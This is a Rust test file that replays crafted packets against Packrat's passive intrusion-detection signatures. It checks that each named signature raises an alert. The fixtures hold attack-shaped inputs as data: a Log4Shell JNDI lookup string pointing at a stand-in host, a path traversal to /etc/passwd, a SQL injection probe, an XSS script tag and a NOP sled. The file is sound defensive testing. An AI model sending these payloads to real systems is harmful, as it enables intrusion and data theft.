//! Replay fixtures for Packrat's shipped passive IDS signatures.

use packrat_tui::net::packet::Packet;
use packrat_tui::net::security::SecurityEngine;
use rstest::rstest;

fn packet(protocol: &str, destination_port: u16, info: &str, bytes: Vec<u8>) -> Packet {
    Packet {
        no: 1,
        timestamp: 1.0,
        src: "203.0.113.9".into(),
        dst: "10.0.0.5".into(),
        protocol: protocol.into(),
        length: bytes.len() as u16,
        info: info.into(),
        src_port: Some(50000),
        dst_port: Some(destination_port),
        vlan_id: None,
        vlan_pcp: None,
        vlan_dei: None,
        outer_vlan_id: None,
        bytes,
    }
}

fn fixture(name: &str) -> Packet {
    match name {
        "EternalBlue" => packet("SMB", 445, "", b"prefixSMBrsuffix".to_vec()),
        "BlueKeep (CVE-2019-0708)" => {
            let mut bytes = vec![0_u8; 120];
            bytes[..3].copy_from_slice(&[0x03, 0x00, 0x00]);
            packet("RDP", 3389, "", bytes)
        }
        "Log4Shell (CVE-2021-44228)" => packet("HTTP", 8080, "", b"${jndi:ldap://example.test/x}".to_vec()),
        "Shellcode NOP sled" => packet("TCP", 4444, "", vec![0x90; 20]),
        "LLMNR Poisoning" => packet("UDP", 5355, "", vec![0; 20]),
        "NBNS WPAD Poisoning" => packet("NBNS", 137, "", vec![0x00, 0x20, 0x43, 0x4b]),
        "Directory Traversal" => packet("HTTP", 80, "", b"../../../../../../etc/passwd".to_vec()),
        "SQL Injection Probe" => packet("HTTP", 80, "", b"UNION SELECT password FROM users".to_vec()),
        "XSS Probe" => packet("HTTP", 80, "", b"<script>alert(1)</script>".to_vec()),
        "Heartbleed (CVE-2014-0160)" => packet("TLS", 443, "", vec![0x18, 0x03, 0x02, 0xff, 0xff, 0x01, 0x00]),
        "PrintNightmare (CVE-2021-1675)" => packet("SMB", 445, "", b"\x1c\x00SpoolSS".to_vec()),
        "Pass-the-Hash (suspected)" => packet("SMB", 445, "", b"NTLMSSP authentication".to_vec()),
        "Log4Shell via DNS (CVE-2021-44228)" => packet("DNS", 53, "query jndi callback", vec![0; 20]),
        _ => panic!("unknown fixture {name}"),
    }
}

#[rstest]
#[case("EternalBlue")]
#[case("BlueKeep (CVE-2019-0708)")]
#[case("Log4Shell (CVE-2021-44228)")]
#[case("Shellcode NOP sled")]
#[case("LLMNR Poisoning")]
#[case("NBNS WPAD Poisoning")]
#[case("Directory Traversal")]
#[case("SQL Injection Probe")]
#[case("XSS Probe")]
#[case("Heartbleed (CVE-2014-0160)")]
#[case("PrintNightmare (CVE-2021-1675)")]
#[case("Pass-the-Hash (suspected)")]
#[case("Log4Shell via DNS (CVE-2021-44228)")]
fn shipped_signature_replays(#[case] signature: &str) {
    let mut security = SecurityEngine::default();
    security.update(&fixture(signature));
    assert!(
        security.ids_alerts.iter().any(|alert| alert.signature == signature),
        "fixture did not trigger {signature}; got {:?}",
        security.ids_alerts.iter().map(|alert| alert.signature).collect::<Vec<_>>(),
    );
}
